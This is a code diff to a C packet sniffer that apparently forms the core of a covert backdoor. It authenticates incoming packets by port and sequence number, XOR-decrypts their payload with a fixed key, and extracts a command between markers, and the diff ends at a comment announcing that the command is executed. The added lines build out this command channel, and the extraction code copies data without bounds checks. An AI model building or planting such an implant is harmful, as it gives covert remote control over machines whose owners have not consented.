@@ -2,8 +2,6 @@
 #include "crypto.h"
 #include "packet_auth.h"
 
-
-
 int get_source_port(const u_char* packet)
 {
     const struct sniff_ip* ip;
@@ -56,6 +54,7 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
     u_int tcp_seqnum;
     
     char* payload;
+    char* end_ptr;
 
     const struct sniff_ip* ip;
     const struct sniff_tcp* tcp;
@@ -71,7 +70,7 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
 
     tcp_sport = ntohs(tcp->th_sport);
     tcp_seqnum = ntohl(tcp->th_seq);
-
+    
     // Step 1: Locate the payload of the packet
     payload = (char*)(packet + ETHER_IP_UDP_LEN);
     if ((header->caplen - ETHER_IP_UDP_LEN - 14) <= 0) // Why 14?
@@ -84,16 +83,25 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
     if (!is_seq_num_auth(tcp_sport, tcp_seqnum)) 
     {
         printf("packet not authenticated\n");
+        printf("source port: %d\n", tcp_sport);
+        printf("sequence_number: %d\n", tcp_seqnum);
         return;
     }
 
     printf("Got an authenticated packet\n Source port: %d\n Seqnum: %d\n", tcp_sport, tcp_seqnum);
     // Step 3: Decrypt the payload
     xor_decrypt(KEY, strlen(KEY), payload, MAX_COMMAND_LEN, decrypted);
-    printf("%s\n", decrypted);
+    //printf("%s\n", decrypted);
     // Step 4: Verify decrypted payload has a command in it
+    if (!(payload = strstr(decrypted, COMMAND_START)))
+        return;
+    payload += strlen(COMMAND_START);
+    if (!(end_ptr = strstr(decrypted, COMMAND_END)))
+        return;
 
     // Step 5: Extract the command
+    memset(command, 0, sizeof(command));
+    strncpy(command, payload, end_ptr - payload);
 
     // Step 6: Execute the command
 
